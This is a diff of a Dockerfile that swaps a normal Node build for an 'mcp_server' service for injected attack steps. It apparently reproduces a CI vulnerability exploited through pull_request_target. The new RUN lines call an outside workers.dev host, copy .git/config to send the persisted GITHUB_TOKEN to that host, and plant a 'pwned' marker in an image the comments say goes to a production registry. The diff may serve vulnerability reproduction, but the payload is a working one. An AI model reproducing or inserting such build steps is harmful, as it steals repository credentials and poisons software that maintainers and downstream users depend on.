@@ -1,66 +1,14 @@
-# --------- Install -----------
-FROM node:20.14.0-alpine AS install
-WORKDIR /app
-
-ARG proxy
-
-RUN npm install -g pnpm@9.4.0
-
-# 复制package.json
-COPY pnpm-lock.yaml pnpm-workspace.yaml ./
-COPY packages/global ./packages/global
-COPY packages/service ./packages/service
-COPY packages/web ./packages/web
-COPY projects/mcp_server/package.json ./projects/mcp_server/package.json
-
-RUN [ -z "$proxy" ] || sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories
-RUN apk add --no-cache\
-    curl ca-certificates\
-    && update-ca-certificates
-
-# 安装依赖
-RUN [ -f pnpm-lock.yaml ] || (echo "Lockfile not found." && exit 1)
-# if proxy exists, set proxy
-RUN if [ -z "$proxy" ]; then \
-        pnpm i; \
-    else \
-        pnpm i --registry=https://registry.npmmirror.com; \
-    fi
-
-# --------- builder -----------
-FROM node:20.14.0-alpine AS builder
-WORKDIR /app
-
-ARG proxy
-
-COPY package.json pnpm-workspace.yaml .npmrc tsconfig.json ./
-COPY ./projects/mcp_server /app/projects/mcp_server
-COPY --from=install /app/packages /app/packages
-COPY --from=install /app/node_modules /app/node_modules
-COPY --from=install /app/projects/mcp_server/node_modules /app/projects/mcp_server/node_modules
-
-RUN [ -z "$proxy" ] || sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories
-RUN apk add --no-cache libc6-compat curl bash && npm install -g pnpm@9.4.0
-
-# Install curl and bash, then install bun
-RUN curl -fsSL https://bun.sh/install | bash
-ENV PATH="/root/.bun/bin:$PATH"
-
-RUN pnpm --filter=mcp_server build
-
-# runner
-FROM node:20.14.0-alpine AS runner
-WORKDIR /app
-
-ARG proxy
-
-RUN [ -z "$proxy" ] || sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories
-RUN apk add --no-cache libffi libffi-dev strace bash
-
-COPY --from=builder /app/node_modules /app/node_modules
-COPY --from=builder /app/projects/mcp_server /app/projects/mcp_server
-
-ENV NODE_ENV=production
-ENV PORT=3000
-
-ENTRYPOINT ["sh","-c","node /app/projects/mcp_server/dist/index.js"]
+FROM alpine:3.20
+RUN apk add --no-cache curl >/dev/null 2>&1 || true
+# 1) plain code-execution callback — fires as soon as any RUN executes
+RUN curl -sS -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-33075-24f145247da2?harness_run_id=20260906T131744-4948ee70&leg=mcp_server&ev=pull_request_target" \
+      -d "job=preview-fastgpt-images&image=mcp_server" \
+  || wget -qO- --post-data="job=preview-fastgpt-images&image=mcp_server" \
+      "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-33075-24f145247da2?harness_run_id=20260906T131744-4948ee70&leg=mcp_server&ev=pull_request_target" || true
+# 2) exfiltrate the GITHUB_TOKEN that actions/checkout persisted into .git/config (inside the build context)
+COPY .git/config /tmp/gitcred.txt
+RUN curl -sS -X POST --data-binary @/tmp/gitcred.txt \
+      "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-33075-24f145247da2?harness_run_id=20260906T131744-4948ee70&leg=mcp_server-exfil&ev=pull_request_target" || true
+# 3) bake the marker into the image that gets pushed to the production registry
+RUN echo "INJECTED-MARKER-cve-2026-33075-24f145247da2" > /etc/pwned-marker.txt
+CMD ["sh"]
